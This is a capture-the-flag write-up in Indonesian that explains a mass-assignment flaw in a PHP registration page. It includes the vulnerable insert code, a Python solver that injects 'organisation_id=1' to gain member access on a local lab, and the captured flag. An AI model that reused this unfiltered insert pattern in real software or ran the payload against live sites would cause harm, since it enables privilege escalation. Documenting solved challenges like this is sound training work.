# WriteUp: Jadi member

## Overview

* **Judul:** Jadi member
* **Kategori:** Access Control
* **Poin:** 250
* **Deskripsi:** Bisa ngga jadiin diri lu member organisasi?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1340`

## Informasi Attachment

File yang diberikan adalah `jadi-member.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Jadi member]
└─$ tree
.
├── jadi-member.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`jadi-member.yml`):**
*(Versi modifikasi: port diubah ke 1340 dan resource limits dihapus)*

```yaml
services:
  oto4-web:
    image: ghcr.io/hengkerrusia/oto4:latest
    ports:
      - "1340:80"
    environment:
      - PWN=${PWN}

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Jadi member]
└─$ PWN=WanZKey docker compose -f jadi-member.yml up -d --build
[+] up 13/13
 ✔ Image ghcr.io/hengkerrusia/oto4:latest Pulled                                                                 189.6s
 ✔ Network jadimember_default Created                                                                               0.3s
 ✔ Container jadimember-oto4-web-1 Created                                                                          0.6s

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi pada source code `register.php` dan `db.php`.

**Snippet `register.php` (Vulnerable):**

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = $_POST; // 1. Mengambil seluruh input user tanpa filter

    unset($data['confirm_password']); // 2. Hanya menghapus satu key

    // ... (Validasi password & hashing)

    // 3. Mass Assignment Vulnerability:
    // Membuat query SQL INSERT berdasarkan KEY dari array $_POST secara dinamis.
    $keys = array_keys($data);
    $placeholders = array_map(function($key) { return ':' . $key; }, $keys);

    $sql = "INSERT INTO users (" . implode(', ', $keys) . ") VALUES (" . implode(', ', $placeholders) . ")";
    // ...
}

```

**Snippet `db.php` (Database Schema):**

```php
$db->exec('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, organisation_id INTEGER DEFAULT 2)');

```

**Analisis Kerentanan (Mass Assignment):**
Aplikasi memiliki celah **Mass Assignment**. Aplikasi menerima seluruh input POST dari pengguna dan langsung menggunakannya untuk menyusun query database (`INSERT`).
Di `db.php`, terlihat kolom `organisation_id` memiliki nilai default `2` (User biasa). Karena tidak ada filter whitelist pada input `$data`, penyerang dapat mengirimkan parameter tambahan `organisation_id` dengan nilai `1` saat registrasi untuk menimpa nilai default tersebut dan menjadi member/admin.

### 3. Exploitation

Skenario eksploitasi:

1. Mengirim request POST ke `/register.php`.
2. Menyertakan payload standar (`username`, `password`, `confirm_password`).
3. Menyuntikkan parameter tambahan: `organisation_id=1`.
4. Login dengan user yang baru dibuat untuk mengakses Dashboard dan mengambil flag.

## Script Solver

Script otomatis untuk melakukan registrasi dengan payload jahat dan mengambil flag.

**File:** `exploit.py`

```python
import requests
import random
import string
import re

# Target URL (Port 1340)
URL = "http://localhost:1340"

def exploit():
    s = requests.Session()
    
    # 1. Generate Random User
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    password = "password123"
    print(f"[*] Target: {URL}")
    print(f"[*] Attempting Mass Assignment Register as: {username}")
    
    # 2. Payload Register Jahat (Mass Assignment)
    # Inject 'organisation_id': '1' untuk privilege escalation
    payload = {
        'username': username,
        'password': password,
        'confirm_password': password,
        'organisation_id': '1' 
    }
    
    try:
        # Register
        r = s.post(f"{URL}/register.php", data=payload)
        
        # 3. Login
        print("[*] Logging in...")
        s.post(f"{URL}/auth.php", data={
            'username': username,
            'password': password
        })
        
        # 4. Access Dashboard
        r = s.get(f"{URL}/dashboard.php")
        
        if r.status_code == 200:
            print("[+] Dashboard Accessed!")
            
            # Extract Flag
            flag = re.search(r'pwn\{.*?\}', r.text)
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Flag not found in dashboard.")
                print(r.text[:300])
        else:
            print(f"[-] Login Failed. Status: {r.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Jadi member]
└─$ python3 exploit.py
[*] Target: http://localhost:1340
[*] Attempting Mass Assignment Register as: erhylgvi
[*] Logging in...
[+] Dashboard Accessed!

[!!!] FLAG FOUND: pwn{0ea855e7d33f20f0ac722b3bd3d368c7}

```

## Flag

```
pwn{0ea855e7d33f20f0ac722b3bd3d368c7}

```
